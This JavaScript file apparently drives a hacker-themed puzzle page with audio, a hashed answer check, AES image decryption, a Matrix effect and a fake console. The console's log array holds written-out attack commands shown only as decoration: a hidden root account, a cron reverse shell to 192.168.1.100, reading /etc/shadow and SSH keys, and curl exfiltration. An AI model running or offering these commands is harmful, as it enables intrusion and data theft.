// Audio Control
let audioPlaying = false;
const audio = new Audio('mixkit-games-music-706.mp3');

function toggleAudio() {
  const audioControlButton = document.querySelector('.audio-control button i');
  if (audioPlaying) {
    audio.pause();
    audioControlButton.classList.remove('fa-pause');
    audioControlButton.classList.add('fa-play');
  } else {
    audio.play();
    audioControlButton.classList.remove('fa-play');
    audioControlButton.classList.add('fa-pause');
  }
  audioPlaying = !audioPlaying;
}

// Decrypt Image and Check Answer
async function submitAnswer() {
  const answer = document.getElementById('answer').value.trim();
  const storedHash = '9251f129e36d22db1b07c86a83bc9268948d98bd80be3b9c6eb8c48ed0ef22ac';
  
  // Hash the user's input
  const answerHash = await crypto.subtle.digest(
    'SHA-256',
    new TextEncoder().encode(answer)
  );
  const hexHash = Array.from(new Uint8Array(answerHash))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');

  if (hexHash === storedHash) {
    decryptImage(answer, 'http://localhost:8080/images/challenge2.png.enc');
  } else {
    alert('Incorrect answer! Try again.');
  }
}

// Decrypt Image Function
async function decryptImage(password, imagePath) {
try {
    // Fetch the encrypted image data
    const response = await fetch(imagePath);
    const encryptedBase64 = await response.text(); // Assuming the encrypted data is Base64 encoded
    const encryptedBlob = Uint8Array.from(atob(encryptedBase64), c => c.charCodeAt(0));

    // Extract the IV and encrypted content
    const iv = encryptedBlob.slice(0, 16); // First 16 bytes are the IV
    const encryptedContent = encryptedBlob.slice(16); // Remaining bytes are the encrypted data

    // Derive the cryptographic key from the password
    const passwordKey = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(password)); // SHA-256 hash of the password
    const key = await crypto.subtle.importKey(
        "raw",
        passwordKey,
        { name: "AES-CBC" },
        false,
        ["decrypt"]
    );

    // Decrypt the data
    const decryptedData = await crypto.subtle.decrypt(
    { name: "AES-CBC", iv: iv },
    key,
    encryptedContent
    );

    // Remove PKCS#7 padding
    const decryptedArray = new Uint8Array(decryptedData);
    const paddingLength = decryptedArray[decryptedArray.length - 1];
    const unpaddedData = decryptedArray.slice(0, decryptedArray.length - paddingLength);

    // Convert decrypted data to Base64 and display the image
    const base64Image = btoa(
    String.fromCharCode(...unpaddedData)
    );
    document.getElementById('challenge-image').src = 'data:image/png;base64,' + base64Image;
} catch (err) {
    alert('Error decrypting the image. Make sure your answer is correct.');
    console.error(err);
}
}
  

// Matrix Effect
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');

// Resize canvas to fit the window
function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}

resizeCanvas();
window.addEventListener('resize', resizeCanvas);

const fontSize = 16; // Size of each character
const columns = Math.floor(canvas.width / fontSize); // Number of columns
const drops = Array(columns).fill(0); // Array to track Y position for each column

function drawMatrix() {
  // Clear the canvas with a transparent black overlay
  ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // Set text properties
  ctx.fillStyle = '#0f0'; // Green text
  ctx.font = `${fontSize}px monospace`;

  for (let i = 0; i < drops.length; i++) {
    // Generate a random character from Katakana Unicode range
    const text = String.fromCharCode(0x30A0 + Math.random() * 96);

    // Draw the character at the current position
    ctx.fillText(text, i * fontSize, drops[i] * fontSize);

    // Move the character down the screen
    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
      // Reset the drop to the top randomly
      drops[i] = 0;
    }
    drops[i]++;
  }
}

// Animate the matrix effect
setInterval(drawMatrix, 50);

function showWhiteRabbit() {
    const rabbit = document.getElementById('white-rabbit');
    const container = document.getElementById('rabbit-container');
  
    // Generate random position within the container
    const randomX = Math.random() * (window.innerWidth - 50); // Ensure the rabbit stays within screen bounds
    const randomY = Math.random() * (window.innerHeight - 50);
  
    // Position the rabbit
    rabbit.style.left = `${randomX}px`;
    rabbit.style.top = `${randomY}px`;
  
    // Fade in the rabbit
    rabbit.style.opacity = 1;
  
    // Fade out after a delay
    setTimeout(() => {
      rabbit.style.opacity = 0;
    }, 4000); // Rabbit stays visible for 2 seconds
  }
  
  // Repeatedly show the rabbit at random intervals
  setInterval(() => {
    showWhiteRabbit();
  }, 60000); // Adjust interval (5000ms = 5 seconds)
  
  function populatePanels() {
    const systemInfo = document.getElementById('system-info');
    const networkInfo = document.getElementById('network-info');
  
    // **System Information**
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
  
    systemInfo.innerHTML = `
      <li><strong>Platform:</strong> ${platform}</li>
      <li><strong>User Agent:</strong> ${userAgent}</li>
      <li><strong>Language:</strong> ${language}</li>
      <li><strong>Screen:</strong> ${screenWidth} x ${screenHeight}</li>
    `;  
    // **Geolocation**
    navigator.geolocation.getCurrentPosition(position => {
      const { latitude, longitude } = position.coords;
      systemInfo.innerHTML += `
        <li><strong>Latitude:</strong> ${latitude.toFixed(4)}</li>
        <li><strong>Longitude:</strong> ${longitude.toFixed(4)}</li>
      `;
    });
  
    // **Fake CPU Usage**
    setInterval(() => {
      const cpuUsage = (Math.random() * 100).toFixed(1);
      const existingCpu = document.getElementById('cpu-usage');
      if (existingCpu) existingCpu.innerHTML = `<strong>CPU:</strong> ${cpuUsage}%`;
      else {
        const cpuElement = document.createElement('li');
        cpuElement.id = 'cpu-usage';
        cpuElement.innerHTML = `<strong>CPU:</strong> ${cpuUsage}%`;
        systemInfo.appendChild(cpuElement);
      }
    }, 2000);

    setInterval(() => {
      const randomLog = logs[Math.floor(Math.random() * logs.length)];
      networkInfo.innerHTML += `<li>${randomLog}</li>`;
    }, 3000);
  }
  
  // Run the function
  populatePanels();
  
  const logs = [
  // Reconnaissance
  'nmap -sS -Pn -T4 -p- 192.168.1.1',
  '[+] Discovered open port: 22 (ssh)',
  '[+] Discovered open port: 80 (http)',
  '[+] Discovered open port: 445 (smb)',
  '[!] Possible SMB vulnerability detected: MS17-010 (EternalBlue)',
  'gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt',
  '[+] Found directory: /admin',
  '[+] Found directory: /config',

  // Exploitation
  'ssh admin@192.168.1.1',
  '[!] Attempting brute force with rockyou.txt...',
  '[+] Successful SSH login: admin:password123',
  '[+] Escalating privileges...',
  'sudo -l',
  '[+] Exploiting sudo misconfiguration...',

  // Persistence
  'useradd -ou 0 -g 0 -M -r -s /bin/bash secretadmin',
  'echo "secretadmin:secretpassword" | chpasswd',
  '[+] Created hidden admin account: secretadmin',
  'echo "* * * * * bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /tmp/crontab',
  '[+] Installed cron job for reverse shell persistence',

  // Privilege Escalation
  'wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh',
  'chmod +x /tmp/linpeas.sh',
  './linpeas.sh | tee /tmp/linpeas_output.txt',
  '[+] Detected vulnerable SUID binary: /usr/bin/vuln_suid',
  '[+] Exploiting /usr/bin/vuln_suid for root access...',

  // Credential Harvesting
  'cat /etc/shadow',
  '[+] Extracted /etc/shadow contents',
  'cat /root/.ssh/id_rsa',
  '[+] Found private SSH key for root user',

  // Lateral Movement
  'ssh -i /tmp/root_key root@192.168.1.2',
  '[+] Successfully logged into 192.168.1.2 as root',
  'cat /etc/shadow',
  '[+] Extracted /etc/shadow from 192.168.1.2',

  // Exfiltration
  '[+] Preparing sensitive data for exfiltration...',
  'tar -czf /tmp/sensitive_data.tar.gz /etc/passwd /etc/shadow /root/.ssh',
  '[+] Compressed sensitive files: sensitive_data.tar.gz',
  'openssl enc -aes-256-cbc -salt -in /tmp/sensitive_data.tar.gz -out /tmp/data.enc -k SuperSecretKey',
  '[+] Encrypted data: /tmp/data.enc',

  // HTTP Transfer
  'curl -X POST -F "file=@/tmp/data.enc" http://192.168.1.100/upload',
  '[+] Data successfully exfiltrated to 192.168.1.100 via HTTP',

  // Cleanup
  'shred -u /tmp/sensitive_data.tar.gz /tmp/data.enc /tmp/linpeas.sh /tmp/root_key',
  '[+] Cleaned up sensitive files from the target system',
  '[!] Exfiltration complete. Exiting...'
];
  
let currentLogIndex = 0;

function generateFakeLogs() {
  const networkInfo = document.getElementById('network-info');

  if (currentLogIndex < logs.length) {
    const logEntry = logs[currentLogIndex];
    const logElement = document.createElement('li');

    // Simulate typing effect for user commands
    if (!logEntry.startsWith('[')) {
      simulateTyping(logEntry, logElement, () => {
        networkInfo.appendChild(logElement);
        processNextLog();
      });
      console.log(logEntry);
    } else if (logEntry.includes('curl') || logEntry.includes('ftp')) {
        // Simulate progress for data transfer actions
        simulateProgress(logElement, logEntry, () => {
          networkInfo.appendChild(logElement);
          processNextLog();
        });
    } else {
      logElement.textContent = logEntry;
      networkInfo.appendChild(logElement);
      processNextLog();
    }
  } else {
    // Restart after a longer delay
    currentLogIndex = 0;
    setTimeout(generateFakeLogs, 8000); // 8 seconds before restarting logs
  }
}

function processNextLog() {
  currentLogIndex++;
  const logEntry = logs[currentLogIndex - 1];
  const delay = logEntry.includes('curl') || logEntry.includes('tar') ? 5000 : 3000; // Longer delay for intensive actions
  setTimeout(generateFakeLogs, delay);
}

// Simulate typing effect for user commands
function simulateTyping(text, logElement, callback) {
    let i = 0;
    logElement.textContent = ''; // Clear previous content
  
    function typeNextCharacter() {
      if (i < text.length) {
        logElement.textContent += text.charAt(i); // Add one character at a time
        i++;
        
        // Random typing interval with jitter
        const typingSpeed = 150 + Math.random() * 100; // Base speed (150ms) + jitter (0-100ms)
        setTimeout(typeNextCharacter, typingSpeed);
      } else {
        callback(); // Invoke the callback after typing finishes
      }
    }
  
    typeNextCharacter(); // Start typing
  }

// Simulate progress for certain actions
function simulateProgress(logElement, logEntry) {
  logElement.textContent = 'Uploading: 0%';
  const networkInfo = document.getElementById('network-info');
  networkInfo.appendChild(logElement);

  let progress = 0;
  const interval = setInterval(() => {
    progress += 5; // Increment progress
    logElement.textContent = `Uploading: ${Math.min(progress, 100)}%`;

    if (progress >= 100) {
      clearInterval(interval);
      logElement.textContent = logEntry.includes('curl')
        ? '[+] Data successfully exfiltrated to 192.168.1.100 via HTTP'
        : '[+] Data successfully uploaded via FTP';
    }
  }, 300); // Update progress every 300ms
}

// Start generating logs
generateFakeLogs();